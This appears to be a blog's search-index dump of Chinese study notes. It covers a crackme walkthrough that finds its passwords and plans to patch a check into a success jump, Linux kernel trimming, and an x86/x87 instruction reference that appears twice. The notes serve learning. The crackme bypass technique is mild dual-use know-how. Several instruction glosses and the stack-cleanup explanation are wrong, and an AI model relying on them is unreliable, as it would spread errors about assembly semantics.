“What’s your password?”，于是在反汇编代码中搜索password字样可找到程序的主流程地址 9.29.1 可以看到puts和scanf等字样，不难理解其为输入输出指令 在63和78行可以看到j_strcmp猜测是做字符串比对 6D和82行通过比对结果来判断是否跳转，如果没有跳转则往下执行会输出Wrong 所以可以猜测密码为--diangroup707--或者you_shall_no_pass 将汇编代码转换为C代码也可验证我们的猜想 9.29.2 解密过程 上一步密码正确后跳转到loc_41419F loc_41419F获取到输入的code(以%d读取)后跳转到sub_4111A4再跳转到sub_413FA0 sub_413FA0做数据初始化，具体的数据看汇编比较难读懂，转成C更容易分析 loc_414029for循环条件 loc_414051文件存储，可以看出该程序创建了一个名为kp的文件在D盘 9.29.3 打开文件发现都是乱码，回头将程序转为C语言查看发现是很麻烦的移位+取异或操作，也难怪汇编代码难看懂…… 9.29.4 问题回答 解密函数调用了文件操作的一系列API(CreateFile、WriteFile、CloseHandle) 参数是如何传递的 在汇编中参数传递有两种方式：lea传值和使用内存存储 在此程序中将参数扩展后存储在eax通用寄存器中，子程序通过读取AL来获取到参数 谁来清理堆栈 清理堆栈通过push ebp和mov ebp,sep两条指令来完成 在此程序中很多个子程序都会清理堆栈 尝试修改源码 对于源码来说改容易，添加不容易，因为添加需要扩展段的空间 尝试将原来的输出Wrong改为跳转到密码正确的程序部分 但暂时还不会重新打包，新人任务Week2中有关于打补丁的内容，这次就不纠结于这个问题了 x32dbg 动态调试可参考逆向工程核心原理 依旧是使用字符串搜索password可定位到main函数部分 9.27.3 可继续使用单步调试走完整个流程，大部分代码与静态分析相似 CTRL+G 转到指定位置 CTRL+E 编辑数据 源码修改即修改指令后打补丁到一个新的exe即可 9.29","categories":[{"name":"网络安全","slug":"网络安全","permalink":"https://liuyi12138.github.io/categories/网络安全/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"https://liuyi12138.github.io/tags/逆向/"},{"name":"汇编","slug":"汇编","permalink":"https://liuyi12138.github.io/tags/汇编/"}]},{"title":"Linux小系统Kernel内核定制","slug":"Linux小系统Kernel内核定制","date":"2019-09-23T00:10:36.000Z","updated":"2021-02-23T06:34:31.910Z","comments":true,"path":"2019/09/23/Linux小系统Kernel内核定制/","link":"","permalink":"https://liuyi12138.github.io/2019/09/23/Linux小系统Kernel内核定制/","excerpt":"17级种子班Linux初步课程step2","text":"17级种子班Linux初步课程step2 Linux内核裁剪Linux内核定制的重点在于内核裁剪，我们需要将内核大小减小到4M以下就需要裁剪.config中的很多配置 linux内核配置 更新GCC版本到4.7以上 下载内核源码并解压 将原内核/boot/config-xxxx.x86_64文件拷贝到解压出的文件夹下命名为.config 使用make localmodconfig命令将已经加载的模块加入.config中，此时编译出的内核是可以使用的，但是大小大概在6.4M左右 使用make menuconfig命令来修改内核配置 makeconfig无法使用可参考解决方案 linux内核裁剪方案12345678910111213141516171819202122232425262728293031323334353637383940414243* make mrproper* make clean* make -j4* make modules_install* make install### General setup* Kernel compression mode-&gt;xz #修改解压方式，大幅减小内核大小### Processor type and features* Build a relocatable kernel #官方说明 （建立一个移动的内核，并增加10% 的内核尺寸，运行时会被丢弃），我觉得没有10%* Enable MPS table #MPS多处理器规范* Support for extended (non-PC) x86 platforms #如果选的话，可以选择支持一些32位X86的平台* kexec system call### General architecture-dependent options* Kprobes### Enable loadable module support* Source checksum for all modules #为所有的模块校验源码* ### Executable file formats* Write ELF core dumps with partial segments #此项必不可删### Networking support* Networking options * TCP* bluetooth* Wireless### Device Drivers* LED Support #LED支持* Network device support * Wireless LAN* Multiple devices driver support (RAID and LVM)### File systems* Ext2 extended attributes #Ext2支持* Ext4 Security Labels #以及去掉所有的安全选项### Kernel hacking* Kernel debugging 内核与外围小系统配置当我们将自己定制的内核和自己的外围小系统放在一起时有会出现很多的问题 因为我们的外围小系统是针对2.8版本内核定制的，所以modules部分需要重新定制，建议直接拷贝新的版本的modules文件夹，大概在3M左右 ssh配置 这是我在配置的时候遇到的最坑的问题，由于在定制外围小系统的时候没有加上与ip有关的依赖，所以无法用ifconfig查看ip地址 首先是ssh和sshd的配置，依旧是可以用我们的脚本来添加依赖，但是要注意有的依赖在/usr/lib64中而不是全都在/lib64 将/etc中的sysconfig、profile、protocols以及/var/empty/sshd拷贝到我们的外围小系统下 在进一步解决一些依赖问题后我遇到了eth0只有ipv6地址没有ipv4 的地址的问题，我将/etc/sysconfig/network-scripts/ifcfg-eth0中的dhcp分配ip改为了静态ip 可参考静态ip配置，但这篇文章中有一点错误在于NM_CONTROLLED=&quot;yes&quot;要改为no，不采用自动分配ip","categories":[{"name":"Linux","slug":"Linux","permalink":"https://liuyi12138.github.io/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://liuyi12138.github.io/tags/Linux/"}]},{"title":"Win32汇编入门","slug":"Win32汇编入门","date":"2019-09-21T09:15:36.000Z","updated":"2021-02-23T06:34:31.910Z","comments":true,"path":"2019/09/21/Win32汇编入门/","link":"","permalink":"https://liuyi12138.github.io/2019/09/21/Win32汇编入门/","excerpt":"网安组新人任务Week1笔记","text":"网安组新人任务Week1笔记 x86汇编门 保护模式下增加了门的概念用来保证低优先级的代码安全调用高优先级的代码 “门”指向某个优先级高的程序所规定的入口，所有优先级低的程序调用优先级高的程序只能通过门重定向到规定的入口点 保护模式下的中断与异常等服务程序也要从门进入(从用户代码切换到操作系统) 在Win32中由于用户程序没有权限修改中断描述符表，所以无法使用int中断，而是用动态链接库来代替中断服务程序 优先级 80386处理器有4个优先级，0是最高级，3是最低级 特权级代码一般是操作系统的代码，其他的是用户代码 在Windows上操作系统运行于0级，应用程序运行于3级 x86寄存器32位CPU寄存器 EAX 累加寄存器 EBX 基地址寄存器 ECX 计数寄存器 EDX 数据寄存器 ESP 堆栈顶指针 EBP 堆栈基指针 ESI 源变址寄存器 EDI 目的变址寄存器 段寄存器 CS 代码段寄存器 DS 数据段寄存器 ES 附加段寄存器 SS 堆栈段寄存器 FS 附加段寄存器 GS 附加段寄存器 16位通用寄存器 AX、BX、CX、DX为通用寄存器 每一个16位通用寄存器可分为两个8位寄存器 AX：AH + AL 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286X86和X87汇编指令大全（有注释） ---------- 一、数据传输指令 ---------------------------------------------------- 它们在存贮器和寄存器、寄存器和输入输出端口之间传送数据. 1. 通用数据传送指令. MOV 传送字或字节. MOVSX 先符号扩展,再传送. MOVZX 先零扩展,再传送. PUSH 把字压入堆栈. POP 把字弹出堆栈. PUSHA 把AX,CX,DX,BX,SP,BP,SI,DI依次压入堆栈. POPA 把DI,SI,BP,SP,BX,DX,CX,AX依次弹出堆栈. PUSHAD 把EAX,ECX,EDX,EBX,ESP,EBP,ESI,EDI依次压入堆栈. POPAD 把EDI,ESI,EBP,ESP,EBX,EDX,ECX,EAX依次弹出堆栈. BSWAP 交换32位寄存器里字节的顺序 XCHG 交换字或字节.(至少有一个操作数为寄存器,段寄存器不可作为操作数) CMPXCHG 比较并交换操作数.(第二个操作数必须为累加器AL/AX/EAX) XADD 先交换再累加.(结果在第一个操作数里) XLAT 字节查表转换.----BX指向一张256字节的表的起点,AL为表的索引值(0-255,即0-FFH);返回AL为查表结果.([BX+AL]-&gt;AL) 2. 输入输出端口传送指令. IN I/O端口输入. ( 语法: IN 累加器, &#123;端口号│DX&#125; ) OUT I/O端口输出. ( 语法: OUT &#123;端口号│DX&#125;,累加器 )输入输出端口由立即方式指定时, 其范围是 0-255; 由寄存器 DX 指定时,其范围是 0-65535. 3. 目的地址传送指令. LEA 装入有效地址.例: LEA DX,string ;把偏移地址存到DX. LDS 传送目标指针,把指针内容装入DS.例: LDS SI,string ;把段地址:偏移地址存到DS:SI. LES 传送目标指针,把指针内容装入ES.例: LES DI,string ;把段地址:偏移地址存到ES:DI. LFS 传送目标指针,把指针内容装入FS.例: LFS DI,string ;把段地址:偏移地址存到FS:DI. LGS 传送目标指针,把指针内容装入GS.例: LGS DI,string ;把段地址:偏移地址存到GS:DI. LSS 传送目标指针,把指针内容装入SS.例: LSS DI,string ;把段地址:偏移地址存到SS:DI. 4. 标志传送指令. LAHF 标志寄存器传送,把标志装入AH. SAHF 标志寄存器传送,把AH内容装入标志寄存器. PUSHF 标志入栈. POPF 标志出栈. PUSHD 32位标志入栈. POPD 32位标志出栈. ---------- 二、算术运算指令 ---------------------------------------------------- ADD 加法. ADC 带进位加法. INC 加 1. AAA 加法的ASCII码调整. DAA 加法的十进制调整. SUB 减法. SBB 带借位减法. DEC 减 1. NEG 求反(以 0 减之). CMP 比较.(两操作数作减法,仅修改标志位,不回送结果). AAS 减法的ASCII码调整. DAS 减法的十进制调整. MUL 无符号乘法.结果回送AH和AL(字节运算),或DX和AX(字运算), IMUL 整数乘法.结果回送AH和AL(字节运算),或DX和AX(字运算), AAM 乘法的ASCII码调整. DIV 无符号除法.结果回送:商回送AL,余数回送AH, (字节运算);或 商回送AX,余数回送DX, (字运算). IDIV 整数除法.结果回送:商回送AL,余数回送AH, (字节运算);或 商回送AX,余数回送DX, (字运算). AAD 除法的ASCII码调整. CBW 字节转换为字. (把AL中字节的符号扩展到AH中去) CWD 字转换为双字. (把AX中的字的符号扩展到DX中去) CWDE 字转换为双字. (把AX中的字符号扩展到EAX中去) CDQ 双字扩展. (把EAX中的字的符号扩展到EDX中去) ---------- 三、逻辑运算指令 ---------------------------------------------------- AND 与运算. OR 或运算. XOR 异或运算. NOT 取反. TEST 测试.(两操作数作与运算,仅修改标志位,不回送结果). SHL 逻辑左移. SAL 算术左移.(=SHL) SHR 逻辑右移. SAR 算术右移.(=SHR) ROL 循环左移. ROR 循环右移. RCL 通过进位的循环左移. RCR 通过进位的循环右移. 以上八种移位指令,其移位次数可达255次. 移位一次时, 可直接用操作码. 如 SHL AX,1. 移位&gt;1次时, 则由寄存器CL给出移位次数. 如 MOV CL,04 SHL AX,CL ---------- 四、串指令 ---------------------------------------------------------- DS:SI 源串段寄存器 :源串变址. ES:DI 目标串段寄存器:目标串变址. CX 重复次数计数器. AL/AX 扫描值. D标志 0表示重复操作中SI和DI应自动增量; 1表示应自动减量. Z标志 用来控制扫描或比较操作的结束. MOVS 串传送.( MOVSB 传送字符. MOVSW 传送字. MOVSD 传送双字. ) CMPS 串比较.( CMPSB 比较字符. CMPSW 比较字. ) SCAS 串扫描.把AL或AX的内容与目标串作比较,比较结果反映在标志位. LODS 装入串.把源串中的元素(字或字节)逐一装入AL或AX中.( LODSB 传送字符. LODSW 传送字. LODSD 传送双字. ) STOS 保存串.是LODS的逆过程. REP 当CX/ECX&lt;&gt;0时重复. REPE/REPZ 当ZF=1或比较结果相等,且CX/ECX&lt;&gt;0时重复. REPNE/REPNZ 当ZF=0或比较结果不相等,且CX/ECX&lt;&gt;0时重复. REPC 当CF=1且CX/ECX&lt;&gt;0时重复. REPNC 当CF=0且CX/ECX&lt;&gt;0时重复. ---------- 五、程序转移指令 ---------------------------------------------------- 1. 无条件转移指令 (长转移) JMP 无条件转移指令 CALL 过程调用 RET/RETF 过程返回. 2. 条件转移指令 (短转移,-128到+127的距离内)( 当且仅当(SF XOR OF)=1时,OP1&lt;OP2 ) JA/JNBE 不小于或不等于时转移. JAE/JNB 大于或等于转移. JB/JNAE 小于转移. JBE/JNA 小于或等于转移. 以上四条,测试无符号整数运算的结果(标志C和Z). JG/JNLE 大于转移. JGE/JNL 大于或等于转移. JL/JNGE 小于转移. JLE/JNG 小于或等于转移. 以上四条,测试带符号整数运算的结果(标志S,O和Z). JE/JZ 等于转移. JNE/JNZ 不等于时转移. JC 有进位时转移. JNC 无进位时转移. JNO 不溢出时转移. JNP/JPO 奇偶性为奇数时转移. JNS 符号位为 &quot;0&quot; 时转移. JO 溢出转移. JP/JPE 奇偶性为偶数时转移. JS 符号位为 &quot;1&quot; 时转移. 3. 循环控制指令(短转移) LOOP CX不为零时循环. LOOPE/LOOPZ CX不为零且标志Z=1时循环. LOOPNE/LOOPNZ CX不为零且标志Z=0时循环. JCXZ CX为零时转移. JECXZ ECX为零时转移. 4. 中断指令 INT 中断指令 INTO 溢出中断 IRET 中断返回 5. 处理器控制指令 HLT 处理器暂停, 直到出现中断或复位信号才继续. WAIT 当芯片引线TEST为高电平时使CPU进入等待状态. ESC 转换到外处理器. LOCK 封锁总线. NOP 空操作. STC 置进位标志位. CLC 清进位标志位. CMC 进位标志取反. STD 置方向标志位. CLD 清方向标志位. STI 置中断允许位. CLI 清中断允许位. ---------- 六、伪指令 ---------------------------------------------------------- DW 定义字(2字节). PROC 定义过程. ENDP 过程结束. SEGMENT 定义段. ASSUME 建立段寄存器寻址. ENDS 段结束. END 程序结束. ---------- 七、处理机控制指令：标志处理指令 ------------------------------------ CLC 进位位置0指令 CMC 进位位求反指令 STC 进位位置为1指令 CLD 方向标志置1指令 STD 方向标志位置1指令 CLI 中断标志置0指令 STI 中断标志置1指令 NOP 无操作 HLT 停机 WAIT 等待 ESC 换码 LOCK 封锁 ========== 浮点运算指令集 ====================================================== ---------- 一、控制指令(带9B的控制指令前缀F变为FN时浮点不检查，机器码去掉9B)---- FINIT 初始化浮点部件 机器码 9B DB E3 FCLEX 清除异常 机器码 9B DB E2 FDISI 浮点检查禁止中断 机器码 9B DB E1 FENI 浮点检查禁止中断二 机器码 9B DB E0 WAIT 同步CPU和FPU 机器码 9B FWAIT 同步CPU和FPU 机器码 D9 D0 FNOP 无操作 机器码 DA E9 FXCH 交换ST(0)和ST(1) 机器码 D9 C9 FXCH ST(i) 交换ST(0)和ST(i) 机器码 D9 C1iii FSTSW ax 状态字到ax 机器码 9B DF E0 FSTSW word ptr mem 状态字到mem 机器码 9B DD mm111mmm FLDCW word ptr mem mem到状态字 机器码 D9 mm101mmm FSTCW word ptr mem 控制字到mem 机器码 9B D9 mm111mmm FLDENV word ptr mem mem到全环境 机器码 D9 mm100mmm FSTENV word ptr mem 全环境到mem 机器码 9B D9 mm110mmm FRSTOR word ptr mem mem到FPU状态 机器码 DD mm100mmm FSAVE word ptr mem FPU状态到mem 机器码 9B DD mm110mmm FFREE ST(i) 标志ST(i)未使用 机器码 DD C0iii FDECSTP 减少栈指针1-&gt;0 2-&gt;1 机器码 D9 F6 FINCSTP 增加栈指针0-&gt;1 1-&gt;2 机器码 D9 F7 FSETPM 浮点设置保护 机器码 DB E4 ---------- 二、数据传送指令 ---------------------------------------------------- FLDZ 将0.0装入ST(0) 机器码 D9 EE FLD1 将1.0装入ST(0) 机器码 D9 E8 FLDPI 将π装入ST(0) 机器码 D9 EB FLDL2T 将ln10/ln2装入ST(0) 机器码 D9 E9 FLDL2E 将1/ln2装入ST(0) 机器码 D9 EA FLDLG2 将ln2/ln10装入ST(0) 机器码 D9 EC FLDLN2 将ln2装入ST(0) 机器码 D9 ED FLD real4 ptr mem 装入mem的单精度浮点数 机器码 D9 mm000mmm FLD real8 ptr mem 装入mem的双精度浮点数 机器码 DD mm000mmm FLD real10 ptr mem 装入mem的十字节浮点数 机器码 DB mm101mmm FILD word ptr mem 装入mem的二字节整数 机器码 DF mm000mmm FILD dword ptr mem 装入mem的四字节整数 机器码 DB mm000mmm FILD qword ptr mem 装入mem的八字节整数 机器码 DF mm101mmm FBLD tbyte ptr mem 装入mem的十字节BCD数 机器码 DF mm100mmm FST real4 ptr mem 保存单精度浮点数到mem 机器码 D9 mm010mmm FST real8 ptr mem 保存双精度浮点数到mem 机器码 DD mm010mmm FIST word ptr mem 保存二字节整数到mem 机器码 DF mm010mmm FIST dword ptr mem 保存四字节整数到mem 机器码 DB mm010mmm FSTP real4 ptr mem 保存单精度浮点数到mem并出栈 机器码 D9 mm011mmm FSTP real8 ptr mem 保存双精度浮点数到mem并出栈 机器码 DD mm011mmm FSTP real10 ptr mem 保存十字节浮点数到mem并出栈 机器码 DB mm111mmm FISTP word ptr mem 保存二字节整数到mem并出栈 机器码 DF mm011mmm FISTP dword ptr mem 保存四字节整数到mem并出栈 机器码 DB mm011mmm FISTP qword ptr mem 保存八字节整数到mem并出栈 机器码 DF mm111mmm FBSTP tbyte ptr mem 保存十字节BCD数到mem并出栈 机器码 DF mm110mmm FCMOVB ST(0),ST(i) &lt;时传送 机器码 DA C0iii FCMOVBE ST(0),ST(i) &lt;=时传送 机器码 DA D0iii FCMOVE ST(0),ST(i) =时传送 机器码 DA C1iii FCMOVNB ST(0),ST(i) &gt;=时传送 机器码 DB C0iii FCMOVNBE ST(0),ST(i) &gt;时传送 机器码 DB D0iii FCMOVNE ST(0),ST(i) !=时传送 机器码 DB C1iii FCMOVNU ST(0),ST(i) 有序时传送 机器码 DB D1iii FCMOVU ST(0),ST(i) 无序时传送 机器码 DA D1iii ---------- 三、比较指令 -------------------------------------------------------- FCOM ST(0)-ST(1) 机器码 D8 D1 FCOMI ST(0),ST(i) ST(0)-ST(1) 机器码 DB F0iii FCOMIP ST(0),ST(i) ST(0)-ST(1)并出栈 机器码 DF F0iii FCOM real4 ptr mem ST(0)-实数mem 机器码 D8 mm010mmm FCOM real8 ptr mem ST(0)-实数mem 机器码 DC mm010mmm FICOM word ptr mem ST(0)-整数mem 机器码 DE mm010mmm FICOM dword ptr mem ST(0)-整数mem 机器码 DA mm010mmm FICOMP word ptr mem ST(0)-整数mem并出栈 机器码 DE mm011mmm FICOMP dword ptr mem ST(0)-整数mem并出栈 机器码 DA mm011mmm FTST ST(0)-0 机器码 D9 E4 FUCOM ST(i) ST(0)-ST(i) 机器码 DD E0iii FUCOMP ST(i) ST(0)-ST(i)并出栈 机器码 DD E1iii FUCOMPP ST(0)-ST(1)并二次出栈 机器码 DA E9 FXAM ST(0)规格类型 机器码 D9 E5 ---------- 四、运算指令 -------------------------------------------------------- FADD 把目的操作数 (直接接在指令后的变量或堆栈缓存器) 与来源操作数 (接在目的操作数后的变量或堆栈缓存器) 相加，并将结果存入目的操作数 FADDP ST(i),ST 这个指令是使目的操作数加上 ST 缓存器，并弹出 ST 缓存器，而目的操作数必须是堆栈缓存器的其中之一，最后不管目的操作数为何，经弹出一次后，目的操作数会变成上一个堆栈缓存器了 FIADD FIADD 是把 ST 加上来源操作数，然后再存入 ST 缓存器，来源操作数必须是字组整数或短整数形态的变数 FSUB 减 FSUBP FSUBR 减数与被减数互换 FSUBRP FISUB FISUBR FMUL 乘 FMULP FIMUL FDIV 除 FDIVP FDIVR FDIVRP FIDIV FIDIVR FCHS 改变 ST 的正负值 FABS 把 ST 之值取出，取其绝对值后再存回去。 FSQRT 将 ST 之值取出，开根号后再存回去。 FSCALE 这个指令是计算 ST*2^ST(1)之值，再把结果存入 ST 里而 ST(1) 之值不变。ST(1) 必须是在 -32768 到 32768 (-215 到 215 )之间的整数，如果超过这个范围计算结果无法确定，如果不是整数 ST(1) 会先向零舍入成整数再计算。所以为安全起见，最好是由字组整数载入到 ST(1) 里。 FRNDINT 这个指令是把 ST 的数值舍入成整数，FPU 提供四种舍入方式，由 FPU 的控制字组(control word)中的 RC 两个位决定 RC 舍入控制 00 四舍五入 01 向负无限大舍入 10 向正无限大舍入 11 向零舍去 ================================================================================","categories":[{"name":"网络安全","slug":"网络安全","permalink":"https://liuyi12138.github.io/categories/网络安全/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"https://liuyi12138.github.io/tags/逆向/"},{"name":"汇编","slug":"汇编","permalink":"https://liuyi12138.github.io/tags/汇编/"}]},{"title":"Win32汇编入门","slug":"软件逆向工程初识","date":"2019-09-21T09:15:36.000Z","updated":"2021-02-23T06:34:31.941Z","comments":true,"path":"2019/09/21/软件逆向工程初识/","link":"","permalink":"https://liuyi12138.github.io/2019/09/21/软件逆向工程初识/","excerpt":"网安组新人任务Week1笔记","text":"网安组新人任务Week1笔记 x86汇编门 保护模式下增加了门的概念用来保证低优先级的代码安全调用高优先级的代码 “门”指向某个优先级高的程序所规定的入口，所有优先级低的程序调用优先级高的程序只能通过门重定向到规定的入口点 保护模式下的中断与异常等服务程序也要从门进入(从用户代码切换到操作系统) 在Win32中由于用户程序没有权限修改中断描述符表，所以无法使用int中断，而是用动态链接库来代替中断服务程序 优先级 80386处理器有4个优先级，0是最高级，3是最低级 特权级代码一般是操作系统的代码，其他的是用户代码 在Windows上操作系统运行于0级，应用程序运行于3级 x86寄存器32位CPU寄存器 EAX 累加寄存器 EBX 基地址寄存器 ECX 计数寄存器 EDX 数据寄存器 ESP 堆栈顶指针 EBP 堆栈基指针 ESI 源变址寄存器 EDI 目的变址寄存器 段寄存器 CS 代码段寄存器 DS 数据段寄存器 ES 附加段寄存器 SS 堆栈段寄存器 FS 附加段寄存器 GS 附加段寄存器 16位通用寄存器 AX、BX、CX、DX为通用寄存器 每一个16位通用寄存器可分为两个8位寄存器 AX：AH + AL 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286X86和X87汇编指令大全（有注释） ---------- 一、数据传输指令 ---------------------------------------------------- 它们在存贮器和寄存器、寄存器和输入输出端口之间传送数据. 1. 通用数据传送指令. MOV 传送字或字节. MOVSX 先符号扩展,再传送. MOVZX 先零扩展,再传送. PUSH 把字压入堆栈. POP 把字弹出堆栈. PUSHA 把AX,CX,DX,BX,SP,BP,SI,DI依次压入堆栈. POPA 把DI,SI,BP,SP,BX,DX,CX,AX依次弹出堆栈. PUSHAD 把EAX,ECX,EDX,EBX,ESP,EBP,ESI,EDI依次压入堆栈. POPAD 把EDI,ESI,EBP,ESP,EBX,EDX,ECX,EAX依次弹出堆栈. BSWAP 交换32位寄存器里字节的顺序 XCHG 交换字或字节.(至少有一个操作数为寄存器,段寄存器不可作为操作数) CMPXCHG 比较并交换操作数.(第二个操作数必须为累加器AL/AX/EAX) XADD 先交换再累加.(结果在第一个操作数里) XLAT 字节查表转换.----BX指向一张256字节的表的起点,AL为表的索引值(0-255,即0-FFH);返回AL为查表结果.([BX+AL]-&gt;AL) 2. 输入输出端口传送指令. IN I/O端口输入. ( 语法: IN 累加器, &#123;端口号│DX&#125; ) OUT I/O端口输出. ( 语法: OUT &#123;端口号│DX&#125;,累加器 )输入输出端口由立即方式指定时, 其范围是 0-255; 由寄存器 DX 指定时,其范围是 0-65535. 3. 目的地址传送指令. LEA 装入有效地址.例: LEA DX,string ;把偏移地址存到DX. LDS 传送目标指针,把指针内容装入DS.例: LDS SI,string ;把段地址:偏移地址存到DS:SI. LES 传送目标指针,把指针内容装入ES.例: LES DI,string ;把段地址:偏移地址存到ES:DI. LFS 传送目标指针,把指针内容装入FS.例: LFS DI,string ;把段地址:偏移地址存到FS:DI. LGS 传送目标指针,把指针内容装入GS.例: LGS DI,string ;把段地址:偏移地址存到GS:DI. LSS 传送目标指针,把指针内容装入SS.例: LSS DI,string ;把段地址:偏移地址存到SS:DI. 4. 标志传送指令. LAHF 标志寄存器传送,把标志装入AH. SAHF 标志寄存器传送,把AH内容装入标志寄存器. PUSHF 标志入栈. POPF 标志出栈. PUSHD 32位标志入栈. POPD 32位标志出栈. ---------- 二、算术运算指令 ---------------------------------------------------- ADD 加法. ADC 带进位加法. INC 加 1. AAA 加法的ASCII码调整. DAA 加法的十进制调整. SUB 减法. SBB 带借位减法. DEC 减 1. NEG 求反(以 0 减之). CMP 比较.(两操作数作减法,仅修改标志位,不回送结果). AAS 减法的ASCII码调整. DAS 减法的十进制调整. MUL 无符号乘法.结果回送AH和AL(字节运算),或DX和AX(字运算), IMUL 整数乘法.结果回送AH和AL(字节运算),或DX和AX(字运算), AAM 乘法的ASCII码调整. DIV 无符号除法.结果回送:商回送AL,余数回送AH, (字节运算);或 商回送AX,余数回送DX, (字运算). IDIV 整数除法.结果回送:商回送AL,余数回送AH, (字节运算);或 商回送AX,余数回送DX, (字运算). AAD 除法的ASCII码调整. CBW 字节转换为字. (把AL中字节的符号扩展到AH中去) CWD 字转换为双字. (把AX中的字的符号扩展到DX中去) CWDE 字转换为双字. (把AX中的字符号扩展到EAX中去) CDQ 双字扩展. (把EAX中的字的符号扩展到EDX中去) ---------- 三、逻辑运算指令 ---------------------------------------------------- AND 与运算. OR 或运算. XOR 异或运算. NOT 取反. TEST 测试.(两操作数作与运算,仅修改标志位,不回送结果). SHL 逻辑左移. SAL 算术左移.(=SHL) SHR 逻辑右移. SAR 算术右移.(=SHR) ROL 循环左移. ROR 循环右移. RCL 通过进位的循环左移. RCR 通过进位的循环右移. 以上八种移位指令,其移位次数可达255次. 移位一次时, 可直接用操作码. 如 SHL AX,1. 移位&gt;1次时, 则由寄存器CL给出移位次数. 如 MOV CL,04 SHL AX,CL ---------- 四、串指令 ---------------------------------------------------------- DS:SI 源串段寄存器 :源串变址. ES:DI 目标串段寄存器:目标串变址. CX 重复次数计数器. AL/AX 扫描值. D标志 0表示重复操作中SI和DI应自动增量; 1表示应自动减量. Z标志 用来控制扫描或比较操作的结束. MOVS 串传送.( MOVSB 传送字符. MOVSW 传送字. MOVSD 传送双字. ) CMPS 串比较.( CMPSB 比较字符. CMPSW 比较字. ) SCAS 串扫描.把AL或AX的内容与目标串作比较,比较结果反映在标志位. LODS 装入串.把源串中的元素(字或字节)逐一装入AL或AX中.( LODSB 传送字符. LODSW 传送字. LODSD 传送双字. ) STOS 保存串.是LODS的逆过程. REP 当CX/ECX&lt;&gt;0时重复. REPE/REPZ 当ZF=1或比较结果相等,且CX/ECX&lt;&gt;0时重复. REPNE/REPNZ 当ZF=0或比较结果不相等,且CX/ECX&lt;&gt;0时重复. REPC 当CF=1且CX/ECX&lt;&gt;0时重复. REPNC 当CF=0且CX/ECX&lt;&gt;0时重复. ---------- 五、程序转移指令 ---------------------------------------------------- 1. 无条件转移指令 (长转移) JMP 无条件转移指令 CALL 过程调用 RET/RETF 过程返回. 2. 条件转移指令 (短转移,-128到+127的距离内)( 当且仅当(SF XOR OF)=1时,OP1&lt;OP2 ) JA/JNBE 不小于或不等于时转移. JAE/JNB 大于或等于转移. JB/JNAE 小于转移. JBE/JNA 小于或等于转移. 以上四条,测试无符号整数运算的结果(标志C和Z). JG/JNLE 大于转移. JGE/JNL 大于或等于转移. JL/JNGE 小于转移. JLE/JNG 小于或等于转移. 以上四条,测试带符号整数运算的结果(标志S,O和Z). JE/JZ 等于转移. JNE/JNZ 不等于时转移. JC 有进位时转移. JNC 无进位时转移. JNO 不溢出时转移. JNP/JPO 奇偶性为奇数时转移. JNS 符号位为 &quot;0&quot; 时转移. JO 溢出转移. JP/JPE 奇偶性为偶数时转移. JS 符号位为 &quot;1&quot; 时转移. 3. 循环控制指令(短转移) LOOP CX不为零时循环. LOOPE/LOOPZ CX不为零且标志Z=1时循环. LOOPNE/LOOPNZ CX不为零且标志Z=0时循环. JCXZ CX为零时转移. JECXZ ECX为零时转移. 4. 中断指令 INT 中断指令 INTO 溢出中断 IRET 中断返回 5. 处理器控制指令 HLT 处理器暂停, 直到出现中断或复位信号才继续. WAIT 当芯片引线TEST为高电平时使CPU进入等待状态. ESC 转换到外处理器. LOCK 封锁总线. NOP 空操作. STC 置进位标志位. CLC 清进位标志位. CMC 进位标志取反. STD 置方向标志位. CLD 清方向标志位. STI 置中断允许位. CLI 清中断允许位. ---------- 六、伪指令 ---------------------------------------------------------- DW 定义字(2字节). PROC 定义过程. ENDP 过程结束. SEGMENT 定义段. ASSUME 建立段寄存器寻址. ENDS 段结束. END 程序结束. ---------- 七、处理机控制指令：标志处理指令 ------------------------------------ CLC 进位位置0指令 CMC 进位位求反指令 STC 进位位置为1指令 CLD 方向标志置1指令 STD 方向标志位置1指令 CLI 中断标志置0指令 STI 中断标志置1指令 NOP 无操作 HLT 停机 WAIT 等待 ESC 换码 LOCK 封锁 ========== 浮点运算指令集 ====================================================== ---------- 一、控制指令(带9B的控制指令前缀F变为FN时浮点不检查，机器码去掉9B)---- FINIT 初始化浮点部件 机器码 9B DB E3 FCLEX 清除异常 机器码 9B DB E2 FDISI 浮点检查禁止中断 机器码 9B DB E1 FENI 浮点检查禁止中断二 机器码 9B DB E0 WAIT 同步CPU和FPU 机器码 9B FWAIT 同步CPU和FPU 机器码 D9 D0 FNOP 无操作 机器码 DA E9 FXCH 交换ST(0)和ST(1) 机器码 D9 C9 FXCH ST(i) 交换ST(0)和ST(i) 机器码 D9 C1iii FSTSW ax 状态字到ax 机器码 9B DF E0 FSTSW word ptr mem 状态字到mem 机器码 9B DD mm111mmm FLDCW word ptr mem mem到状态字 机器码 D9 mm101mmm FSTCW word ptr mem 控制字到mem 机器码 9B D9 mm111mmm FLDENV word ptr mem mem到全环境 机器码 D9 mm100mmm FSTENV word ptr mem 全环境到mem 机器码 9B D9 mm110mmm FRSTOR word ptr mem mem到FPU状态 机器码 DD mm100mmm FSAVE word ptr mem FPU状态到mem 机器码 9B DD mm110mmm FFREE ST(i) 标志ST(i)未使用 机器码 DD C0iii FDECSTP 减少栈指针1-&gt;0 2-&gt;1 机器码 D9 F6 FINCSTP 增加栈指针0-&gt;1 1-&gt;2 机器码 D9 F7 FSETPM 浮点设置保护 机器码 DB E4 ---------- 二、数据传送指令 ---------------------------------------------------- 